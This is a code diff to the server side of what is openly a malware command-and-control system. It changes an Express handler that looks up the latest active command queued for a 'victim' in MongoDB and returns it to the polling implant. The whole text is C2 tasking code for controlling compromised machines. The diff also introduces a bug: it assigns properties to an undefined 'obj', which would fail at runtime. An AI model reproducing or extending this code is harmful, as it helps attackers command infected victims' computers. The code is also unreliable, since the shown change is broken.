@@ -49,22 +49,30 @@ async function initialHandshake(req, res) {
 async function getCmd(req, res) {
 	const username = req.decoded["username"];
 
-	const filterVictim = { victimId: username }; // desired filter criteria
+	const filterVictim = { victimId: username, active: true }; // desired filter criteria
 
 	const victimCmdList = await mongodb.VictimCommands.find(filterVictim)
 		.sort({ timestamp: -1 }) // Sort in descending order based on timestamp
 		.limit(1) // Limit the result to 1 record (the latest one)
 		.exec();
+	
+	let obj;
 
 	if (victimCmdList.length > 0) {
 		const latestCmd = victimCmdList[0];
+
+		obj.commandId = latestCmd._id;
+		obj.command = latestCmd.command;
+		obj.active = latestCmd.active;
+		obj.victimId = latestCmd.victimId;
+
 		return res.status(200).send({
 			status: true,
-			latestCmd,
+			obj,
 		});
 	} else {
 		console.log("No commands found for the victim.");
-		return res.status(200).send({
+		return res.status(400).send({
 			status: false,
 			message: "No commands found for the victim.",
 		});
